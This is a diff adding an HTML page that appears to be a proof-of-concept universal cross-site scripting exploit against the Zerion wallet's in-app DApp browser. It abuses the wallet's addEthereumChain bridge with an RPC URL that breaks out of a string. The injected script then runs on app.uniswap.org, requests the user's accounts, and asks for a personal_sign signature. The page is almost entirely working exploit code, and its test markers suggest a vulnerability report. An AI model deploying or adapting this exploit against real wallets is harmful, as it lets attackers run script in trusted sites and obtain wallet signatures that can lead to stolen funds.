@@ -1,0 +1,133 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>zerion.io</title>
+</head>
+<body>
+  <pre id="status">Waiting for Zerion page metadata...</pre>
+
+  <script>
+    const status = document.getElementById("status");
+    const bounceUrl = "dp.html";
+    let started = false;
+
+    function start() {
+      if (started) return;
+
+      const bridge =
+        window.webkit &&
+        window.webkit.messageHandlers &&
+        window.webkit.messageHandlers.ethereumWeb3Bridge;
+
+      if (!bridge) {
+        status.textContent =
+          "ethereumWeb3Bridge tidak tersedia. Buka di DApp browser Zerion.";
+        return;
+      }
+
+      started = true;
+
+      const marker =
+        "(()=>{" +
+          "if(location.hostname!=='app.uniswap.org'){" +
+            "if(!location.pathname.endsWith('/dp.html'))" +
+              "location.assign('dp.html');" +
+            "return;" +
+          "}" +
+          "setTimeout(async()=>{" +
+            "if(window.__zerionUxssSignProbe)return;" +
+            "window.__zerionUxssSignProbe=true;" +
+            "alert(document.domain);" +
+            "const p=window.ethereum;" +
+            "if(!p||typeof p.request!=='function'){" +
+              "alert('UXSS|'+location.origin+'|provider=no');" +
+              "return;" +
+            "}" +
+            "const m='0x5a4552494f4e5f555853535f544553545f4f4e4c59';" +
+            "let phase='connect';" +
+            "try{" +
+              "let a=await p.request({method:'eth_accounts'});" +
+              "let state='existing';" +
+              "if(!a||!a.length){" +
+                "a=await p.request({method:'eth_requestAccounts'});" +
+                "state='approved';" +
+              "}" +
+              "if(!a||!a[0])throw new Error('no account returned');" +
+              "phase='sign';" +
+              "const s=await p.request({method:'personal_sign',params:[m,a[0]]});" +
+              "alert('UXSS|'+location.origin+'|connect='+state+'|sign=approved|account='+a[0]+'|signature-prefix='+String(s).slice(0,18));" +
+            "}catch(e){" +
+              "alert('UXSS|'+location.origin+'|'+phase+'=denied|error='+(e&&e.message||e));" +
+            "}" +
+          "},0);" +
+        "})()";
+
+      const injectedRpcUrl =
+        "https://coston-api.flare.network/ext/C/rpc#\",[" +
+        marker +
+        "]: \"";
+
+      const provider = window.ethereum;
+      if (provider && typeof provider.on === "function") {
+        provider.on("chainChanged", function () {
+          location.assign(bounceUrl);
+        });
+      }
+
+      bridge.postMessage({
+        id: Date.now(),
+        name: "addEthereumChain",
+        object: {
+          chainId: "0x10",
+          chainName: "Coston Testnet UXSS Probe",
+          rpcUrls: [injectedRpcUrl],
+          blockExplorerUrls: [
+            "https://coston-explorer.flare.network/"
+          ],
+          iconUrls: [],
+          nativeCurrency: {
+            name: "Coston Flare",
+            symbol: "CFLR",
+            decimals: 18
+          }
+        }
+      });
+
+      status.textContent =
+        "Request sent. Approve Add Network; the transition page will open automatically.";
+    }
+
+    function nextFrame() {
+      return new Promise(function (resolve) {
+        requestAnimationFrame(resolve);
+      });
+    }
+
+    function delay(ms) {
+      return new Promise(function (resolve) {
+        setTimeout(resolve, ms);
+      });
+    }
+
+    async function startAfterPageMetadata() {
+  
+      status.textContent =
+        "Page loaded. Waiting for Zerion to register title: " + document.title;
+
+      await nextFrame();
+      await nextFrame();
+      await delay(1000);
+
+      start();
+    }
+
+    if (document.readyState === "complete") {
+      startAfterPageMetadata();
+    } else {
+      window.addEventListener("load", startAfterPageMetadata, { once: true });
+    }
+  </script>
+</body>
+</html>
